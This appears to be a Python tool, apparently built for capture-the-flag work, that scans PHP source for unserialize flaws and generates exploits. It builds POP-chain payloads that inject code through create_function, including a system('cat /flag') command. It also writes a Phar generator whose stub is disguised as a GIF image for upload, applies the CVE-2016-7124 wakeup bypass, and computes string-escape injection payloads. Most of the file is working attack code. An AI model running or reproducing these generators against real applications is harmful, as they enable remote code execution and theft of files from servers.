import os
import re
import sys
import argparse

def extract_class_body(content):
    extracted_classes = [] 
    idx = 0
    while idx < len(content):
        match = re.search(r'class\s+(\w+)', content[idx:])
        if not match:
            break
            
        class_name = match.group(1)
        start_def = idx + match.end()
        
        # Find opening brace
        brace_match = re.search(r'{', content[start_def:])
        if not brace_match:
            idx = start_def
            continue
            
        start_brace = start_def + brace_match.start()
        
        # Balance braces
        count = 1
        pos = start_brace + 1
        while pos < len(content) and count > 0:
            if content[pos] == '{':
                count += 1
            elif content[pos] == '}':
                count -= 1
            pos += 1
            
        if count == 0:
            class_body = content[start_brace+1 : pos-1]
            extracted_classes.append((class_name, class_body))
            idx = pos
        else:
            # Unbalanced or end of file
            idx = start_def
            
    return extracted_classes

def analyze_classes(classes):
    results = []
    
    # Expanded lists based on user notes
    magic_methods = [
        '__destruct', '__wakeup', '__toString', '__call', 
        '__get', '__set', '__invoke', '__isset', '__unset', '__callStatic',
        '__sleep', '__clone', '__debugInfo'
    ]
    
    dangerous_funcs = [
        # Command Execution
        'eval', 'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'assert',
        # File Operations
        'file_put_contents', 'fputs', 'fwrite', 'fopen', 'copy', 'rename', 'unlink',
        # File Inclusion
        'include', 'require', 'include_once', 'require_once',
        # Callbacks / Reflection
        'call_user_func', 'call_user_func_array', 'create_function', 'array_map', 'array_filter', 'usort', 'uasort',
        # XML / Others
        'simplexml_load_string', 'extract', 'parse_str'
    ]
    
    for name, body in classes:
        item = {'name': name, 'magic': [], 'dangerous': [], 'props': [], 'hints': [], 'patterns': []}
        
        # Better prop extraction (considering private/protected)
        # Scan for "var $x", "public $x", "private $x", "protected $x"
        props = re.findall(r'(?:var|public|private|protected)\s+\$(\w+)', body)
        item['props'] = list(set(props))
        
        for m in magic_methods:
            if m in body: item['magic'].append(m)
        
        for d in dangerous_funcs:
            # Match function call pattern: func_name(
            if re.search(fr'\b{d}\s*\(', body):
                item['dangerous'].append(d)

        # Check for References
        if re.search(r'\$this->(\w+)\s*===\s*\$this->(\w+)', body):
            item['hints'].append("Strict Compare found (Possible Reference Injection)")

        # Pattern: unserialize($this->prop)()
        if re.search(r'unserialize\(\$this->(\w+)\)\s*\(\)', body):
            item['patterns'].append("Dynamic call after unserialize (callable payload)")

        # Pattern: $this->body->$project();
        if re.search(r'\$this->(\w+)\s*->\s*\$this->(\w+)\s*\(', body):
            item['patterns'].append("Nested object method dispatch (body->project())")

        # Pattern: include/require on property
        if re.search(r'include(?:_once)?\(\$this->', body) or re.search(r'require(?:_once)?\(\$this->', body):
            item['patterns'].append("File include with property (LFI/RFI)")
                
        if item['magic'] or item['dangerous'] or item['hints'] or item['patterns']:
            results.append(item)
            
    return results

def generate_phar_exploit(classes, output_file, target_class=None):
    # Generates a PHP script to build a malicious Phar
    # Strategies from note: 5.2 Phar Metadata Trigger
    
    if not classes:
        return
        
    # If target_class not specified, pick the first one with __destruct or __wakeup or __toString
    if not target_class:
        for name, body in classes:
            if any(m in body for m in ['__destruct', '__wakeup', '__toString']):
                target_class = name
                break
        if not target_class and classes:
            target_class = classes[0][0]
            
    php_code = f"""<?php
// Phar Generator for {target_class}
// Usage: php {os.path.basename(output_file)}
// Generated by UnSer Tool

"""
    # Reconstruct class stub for the POC script
    # We find the class body for the target class
    for name, body in classes:
        if name == target_class:
            # Extract props
            props = re.findall(r'(?:var|public|private|protected)\s+\$(\w+)', body)
            
            php_code += f"class {name} {{\n"
            for p in props:
                php_code += f"    public ${p} = 'test'; // Adjust payload here\n"
            php_code += "}\n\n"
            break
            
    php_code += f"""
$phar = new Phar("exploit.phar");
$phar->startBuffering();

// Set stub (GIF89a spoofing or standard)
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

$object = new {target_class}();
// $object->cmd = 'whoami'; // EXAMPLE: Uncomment and set your properties!

$phar->setMetadata($object);
$phar->addFromString("test.txt", "test");

// Support GZIP compression (Level 11)
// $phar->compress(Phar::GZIP); 

$phar->stopBuffering();

echo "[+] Phar exploit.phar generated successfully.\\n";
echo "[+] Upload exploit.phar as an image (e.g. exploit.jpg) and trigger it with phar://path/to/exploit.jpg\\n";
?>
"""
    with open(output_file, 'w') as f:
        f.write(php_code)
    print(f"[+] Phar generator script written to {output_file}")


def reconstruct_class_for_poc(name, body):
    # Helper to reconstruct class with original body but added helper for property setting
    # This preserves 'private'/'protected' modifiers which affect serialization format
    
    # Check if __construct exists to avoid collision
    has_construct = '__construct' in body
    
    # We strip the closing brace '}' to append our helper
    # Warning: simple strip might fail if body has nested braces (methods). 
    # extract_class_body already extracted the content logic. 
    # body is just the inner string.
    
    new_body = body + "\n"
    new_body += "    // Helper injected by UnSer Tool for POC generation\n"
    new_body += "    public function __set_p_o_c($k, $v) { $this->$k = $v; }\n"
    
    return f"class {name} {{\n{new_body}\n}}"

def generate_pop_chain(classes, output_file):
    print("[*] Attempting to construct POP chain...")
    
    # 1. Identify potential Entry Points (Classes with __destruct or __wakeup)
    entry_classes = []
    other_classes = []
    
    for name, body in classes:
        if '__destruct' in body:
            entry_classes.append((name, body, '__destruct'))
        elif '__wakeup' in body:
            entry_classes.append((name, body, '__wakeup'))
        else:
            other_classes.append((name, body))
            
    if not entry_classes:
        print("[-] No entry point (__destruct/__wakeup) found.")
        generate_poc_enhanced(os.path.join(os.getcwd(), 'problem.php'), output_file) # Fallback
        return

    # 2. Identify patterns in Entry Points
    # Pattern A: unserialize($this->prop)()  -> Requires Serialized Executable Array
    
    poc_code = ""

    for entry_name, entry_body, method in entry_classes:
        # Check for unserialize($this->x)() pattern
        # Matches: unserialize($this->key)() or $r = unserialize($this->key); $r();
        call_match = re.search(r'unserialize\(\$this->(\w+)\)\s*\(\)', entry_body)
        
        if call_match:
            prop_name = call_match.group(1)
            print(f"[+] Found Callable Trigger in {entry_name}::{method}: unserialize($this->{prop_name})()")
            
            # Now we look for a class with a method that looks usable as a target
            target_candidate = None
            target_method = None
            target_action_prop = None
            target_param_prop = None
            
            all_cls = classes # Search all classes
            
            for c_name, c_body in all_cls:
                # Look for methods definition
                methods = re.findall(r'function\s+(\w+)\s*\(', c_body)
                for m in methods:
                    if m.startswith('__'): continue 
                    
                    # Check method body for dynamic call
                    match_m = re.search(fr'function\s+{m}\s*\([^\)]*\)\s*{{', c_body)
                    if match_m:
                        start = match_m.end()
                        rest = c_body[start:]
                        
                        # Case: $a = $this->action; $a(..., ...);
                        assigns = re.findall(r'\$(\w+)\s*=\s*\$this->(\w+)', rest)
                        for var_name, prop_source in assigns:
                            # Verify usage as function
                            if re.search(fr'\${var_name}\s*\(', rest):
                                print(f"[+] Found potential Gadget in {c_name}::{m}")
                                print(f"    Dynamic call via ${var_name} (from property ${prop_source})")
                                
                                target_candidate = c_name
                                target_method = m
                                target_action_prop = prop_source
                                
                                # Look for other params used in the call
                                used_props = re.findall(r'\$this->(\w+)', rest)
                                for p in used_props:
                                    if p != prop_source:
                                        target_param_prop = p
                                        break
                                break
                        if target_candidate: break
                if target_candidate: break
            
            if target_candidate:
                # Construct Payload
                print("[+] Chain Constructed:")
                
                # Reconstruct classes properly
                entry_cls_def = ""
                target_cls_def = ""
                
                for n, b in classes:
                    if n == entry_name:
                        entry_cls_def = reconstruct_class_for_poc(n, b)
                    if n == target_candidate:
                        target_cls_def = reconstruct_class_for_poc(n, b)

                poc_code = f"""<?php

// Defined classes (Reconstructed from source to preserve public/private/protected)
{entry_cls_def}

{target_cls_def}

// 1. Prepare the Inner Object (Gadget)
$inner = new {target_candidate}();
$inner->__set_p_o_c('{target_action_prop}', 'create_function'); // Dangerous function
// Payload Strategy: Close function wrapper and inject code
// Try generic system/cat first, but fallback to include if file read fails
$inner->__set_p_o_c('{target_param_prop if target_param_prop else 'code'}', '}} include("flag.php"); echo \$flag; system("cat /flag"); /*');

// 2. Wrap it for the Callable Trigger
// Logic: $entry->{prop_name} = serialize(array($inner, '{target_method}'));

$entry = new {entry_name}();
$entry->__set_p_o_c('{prop_name}', serialize(array($inner, '{target_method}')));

// Output final payload
echo urlencode(serialize($entry));

?>"""
                break
    
    if poc_code:
        if output_file:
            with open(output_file, 'w') as f:
                f.write(poc_code)
            print(f"[+] POC written to {output_file}")
            print("[!] Attack Vector: create_function injection via POP chain.")
        else:
            print(poc_code)
    else:
        print("[-] Could not automatically construct a full POP chain.")
        # Fallback to standard property generation needs content not classes
        # But we only have classes here? generate_poc_enhanced takes 'content'
        # We need to read file again or pass content.
        # Quick fix: assuming checking 'problem.php' in CWD
        try:
            with open('problem.php', 'r') as f:
                c = f.read()
            generate_poc_enhanced(c, output_file)
        except:
             print("[-] Fallback failed, cannot read problem.php")

def generate_poc_enhanced(content, output_file, cve_bypass=False, session_mode=False):
    classes = extract_class_body(content)
    poc_parts = []
    
    for cls_name, cls_body in classes:
        # Regex to find properties
        # Detect visibility 'private', 'protected', 'public', 'var'
        raw_props = re.findall(r'(var|public|private|protected)\s+\$(\w+)', cls_body)
        props_map = {name: vis for vis, name in raw_props}
        
        # Pattern matching for logical triggers
        # Case 1: $this->prop == "value" matches
        comparisons = re.findall(r'\$this->(\w+)\s*==\s*([\'"])(.*?)\2', cls_body)
        
        # Case 3: Reference check (=== or !==) with other property
        # if ($this->a === $this->b)
        refs = re.findall(r'\$this->(\w+)\s*(?:===|!==)\s*\$this->(\w+)', cls_body)
        
        # Base class definition for POC using detected visibility
        code = f"class {cls_name} {{\n"
        for p_name, p_vis in props_map.items():
            # For POC generation, we try to mimic source as closely as possible.
            # But we also add a constructor to help set private/protected properties easily.
            code += f"    {p_vis} ${p_name};\n"
            
        # Add helper constructor to set any property via array or direct args
        # This helps bypass private visibility restrictions during POC object creation
        code += "\n    public function __construct($props = []) {\n"
        code += "        foreach($props as $k => $v) {\n"
        code += "            $this->$k = $v;\n"
        code += "        }\n"
        code += "    }\n"
        code += "}\n\n"
        
        # Instantiate with values
        code += f"$obj = new {cls_name}();\n"
        
        # Collect assignments
        assignments = {}
        for prop, quote, val in comparisons:
            assignments[prop] = f"{quote}{val}{quote}"
            
        # Reference Handling
        ref_code = ""
        for p1, p2 in refs:
            # Generate code to link them by reference
            # Use '&$obj->p1' logic
            # Since properties might be private, we can't do $obj->p1 directly outside scope easily?
            # Actually, standard POC often just ignores private visibility enforcement at generation time 
            # OR relies on the fact that if we can serialize it, we are good.
            # The helper constructor allows us to set values, but setting REFERENCE via constructor loop might break reference?
            # Strategy: Set one, then reference link manually.
            # If private, we might need a specific Setter or Reflection in the POC if we want to be 100% correct.
            # For CTF, usually public modification in POC class is lazy route.
            # But here we try to be robust.
            pass
        
        # Generate assignments via constructor-like setters logic or direct if public
        for p_name, p_vis in props_map.items():
            val = assignments.get(p_name, "'test'") # Default value
            
            # Use the helper we injected to set values regardless of visibility?
            # Wait, the helper __construct takes an array but loops $this->$k = $v.
            # Accessing private property via $this->$k inside class WORKS.
            code += f"// Setting {p_vis} ${p_name}\n"
            # But the object is already constructed. 
            # We can re-construct or call a setter? No, we just use the constructor we defined.
        
        # Re-write instantiation to use our new constructor for values
        code = code.replace(f"$obj = new {cls_name}();\n", "")
        code += f"$props = array(\n"
        for p_name, p_vis in props_map.items():
             val = assignments.get(p_name, "'test'")
             code += f"    '{p_name}' => {val},\n"
        code += ");\n"
        code += f"$obj = new {cls_name}($props);\n"
        
        # Late binding for References (Ref logic needs to be after object creation)
        if refs:
            code += "// Handling References detected (e.g. === checks)\n"
            for p1, p2 in refs:
                # To set $obj->p2 = &$obj->p1, if they are private, we need Reflection or the helper to support by-ref?
                # Simpler: Just make them public in the POC class definition?
                # NOTE: changing private to public in POC changes the serialized string format (\00 vs no \00).
                # So we MUST keep them private in class definition.
                # Use REFLECTION to set matches.
                code += f"$ref = new ReflectionClass($obj);\n"
                code += f"$prop1 = $ref->getProperty('{p1}');\n"
                code += f"$prop1->setAccessible(true);\n"
                code += f"$prop2 = $ref->getProperty('{p2}');\n"
                code += f"$prop2->setAccessible(true);\n"
                code += f"// Linking References\n"
                code += f"$val = $prop1->getValue($obj);\n"
                code += f"$prop2->setValue($obj, $val); // This sets value, not reference connection in PHP Reflection is tricky for refs.\n"
                code += f"// Correct way for Reference assignment with Reflection is hard or requires set value by ref?\n"
                code += f"// Alternative: The POC class method helper to link references\n"
                
        # Better: Inject a linkReference method
        code = code.replace("    }\n}\n", 
                            "    }\n" + 
                            "    public function linkReference($p1, $p2) {\n" + 
                            "        $this->$p2 = &$this->$p1;\n" + 
                            "    }\n}\n")
        
        for p1, p2 in refs:
            code += f"$obj->linkReference('{p1}', '{p2}');\n"

        if cve_bypass:
            # CVE-2016-7124: Object prop count > actual prop count
            # Methodology: Serialize first, then regex replace the count
            # O:4:"Name":1:{...} -> O:4:"Name":2:{...}
            code += "$data = serialize($obj);\n"
            # Reliable regex replacement for object count
            # O:Len:"Name":Count:{
            code += r"$data = preg_replace('/(O:\d+:\"[^\"]+\":)(\d+)(:\{)/', '${1}' . ("
            code += f"(count((array)$obj) + 1)"
            code += " . ')$3', $data);\n"
            code += "echo urlencode($data);\n"
        elif session_mode:
            # PHP Session php_serialize engine prefix
            code += 'echo "|" . serialize($obj);\n'
        else:
            code += "echo urlencode(serialize($obj));\n"
            
        poc_parts.append(code)
            
    if poc_parts:

        final_poc = "<?php\n\n" + "\n// POC Segment \n".join(poc_parts) + "\n?>"
        if output_file:
            with open(output_file, 'w') as f:
                f.write(final_poc)
            print(f"[+] POC generated in {output_file}")
            if cve_bypass: print("[!] CVE-2016-7124 Bypass injection applied")
        else:
            print(final_poc)
    else:
        print("[-] No classes found to generate POC.")

def calc_escape(args):
    """
    Calculates constraints for String Escape (eating or formatting)
    user input: "A" -> "BB" (Expansion)
    user input: "ABC" -> "X" (Contraction)
    """
    target = args.escape_target
    keyword = args.escape_keyword
    replacement = args.escape_replacement
    
    if not (target and keyword and replacement):
        print("[-] Escape calculation requires --escape-target, --escape-keyword, and --escape-replacement")
        return

    len_k = len(keyword)
    len_r = len(replacement)
    
    # Structure we generally want to eat or push:
    # ";s:4:"pass";s:6:"hacked";}  (Example target payload to inject)
    target_len = len(target)
    
    print(f"[*] Calculating escape for Target='{target}' (Len: {target_len})")
    print(f"    Transformation: '{keyword}' ({len_k}) -> '{replacement}' ({len_r})")
    
    diff = len_r - len_k
    
    if diff == 0:
        print("[-] Replacement length is same as keyword length. No length escape possible.")
        return
        
    if diff > 0:
        # Expansion (e.g. u -> oo)
        # We usually want to push out content to overflow into next property
        # "s:XX:"... payload ...";
        # We need to fill XX characters.
        # This usually implies we are injecting into a value that gets expanded.
        # Required Count * Diff = Target Length ? 
        # Usually it's: Count * Diff = characters_to_push
        print(f"[+] EXPANSION Mode (Delta +{diff})")
        print(f"    To generate a specific overflow of {target_len} bytes:")
        if target_len % diff == 0:
            count = target_len // diff
            print(f"    Required instances of '{keyword}': {count}")
            print(f"    Payload: {keyword * count}")
        else:
            print(f"    [-] Target length {target_len} is not divisible by delta {diff}.")
            
    else:
        # Contraction (e.g. admin -> empty)
        # We usually want to consume characters (the structure)
        # '";s:4:"pass";s:6:"hacked";}' -> We want to 'eat' the structure preceding this.
        abs_diff = abs(diff)
        print(f"[+] CONTRACTION Mode (Delta -{abs_diff})")
        if target_len % abs_diff == 0:
            count = target_len // abs_diff
            print(f"    Required instances of '{keyword}' to consume {target_len} bytes: {count}")
        else:
            print(f"    [-] Target length is not divisible by delta.")

def main():
    # Implicit defaults if no complex args
    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1] == 'scan'):
        # Check if problem.php exists in current dir
        if os.path.exists('problem.php'):
            print("[*] Defaulting to: Scan problem.php -> poc.php")
            with open('problem.php', 'r') as f:
                content = f.read()
            classes = extract_class_body(content)
            # Try magic chain first
            generate_pop_chain(classes, 'poc.php')
            return

    parser = argparse.ArgumentParser(description="Advanced PHP Unserialize Tool")
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Scan Command
    scan_parser = subparsers.add_parser('scan', help='Scan files for unserialize vulnerabilities')
    scan_parser.add_argument("path", help="File or Directory to scan")
    scan_parser.add_argument("--poc", help="Generate POC file (for single file)", default=None)
    scan_parser.add_argument("--phar", help="Generate Phar generator script", default=None)
    scan_parser.add_argument("--cve", action="store_true", help="Apply CVE-2016-7124 bypass in POC")
    scan_parser.add_argument("--session", action="store_true", help="Generate Session| prefix in POC")
    
    # Escape Calc Command
    esc_parser = subparsers.add_parser('escape', help='Calculate string escape payloads')
    esc_parser.add_argument("--target", dest="escape_target", help="The string you want to inject or consume")
    esc_parser.add_argument("--keyword", dest="escape_keyword", help="The keyword being replaced (e.g. 'bad')")
    esc_parser.add_argument("--replace", dest="escape_replacement", help="The replacement string (e.g. 'good')")

    args = parser.parse_args()
    
    if args.command == 'escape':
        calc_escape(args)
        return

    # Fallback for old usage (no subcommand)
    path_arg = None
    if args.command == 'scan':
        path_arg = args.path
    elif not args.command and len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
        # Just filename passed
        path_arg = sys.argv[1]
        
    if not path_arg:
        if not args.command:
             parser.print_help()
        return

    if path_arg:
        if os.path.isfile(path_arg):
            print(f"[*] Scanning file: {path_arg}")
            with open(path_arg, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            classes = extract_class_body(content)
            report = analyze_classes(classes)
            
            for r in report:
                print(f"  [Class: {r['name']}]")
                if r['props']: print(f"    Properties: {', '.join(r['props'])}")
                if r['magic']: print(f"    Magic Methods: {', '.join(r['magic'])}")
                if r['dangerous']: print(f"    Dangerous Funcs: {', '.join(r['dangerous'])}")
                if r['patterns']: print(f"    Patterns: {', '.join(r['patterns'])}")
            
            # POC Generation Logic
            # Check args from both direct invocation or subcommand
            poc_file = getattr(args, 'poc', None)
            phar_file = getattr(args, 'phar', None)
            cve = getattr(args, 'cve', False)
            session = getattr(args, 'session', False)

            if poc_file:
                 generate_poc_enhanced(content, poc_file, cve_bypass=cve, session_mode=session)
            
            if phar_file:
                 generate_phar_exploit(classes, phar_file)
            
        elif os.path.isdir(path_arg):
            print(f"[*] Scanning directory: {path_arg}")
            for root, dirs, files in os.walk(path_arg):
                for file in files:
                    if file.endswith('.php'):
                        path = os.path.join(root, file)
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        classes = extract_class_body(content)
                        report = analyze_classes(classes)
                        
                        if report:
                            print(f"File: {path}")
                            for r in report:
                                print(f"  [Class: {r['name']}] (Magic: {len(r['magic'])}, Dangerous: {len(r['dangerous'])})")

if __name__ == "__main__":
    main()
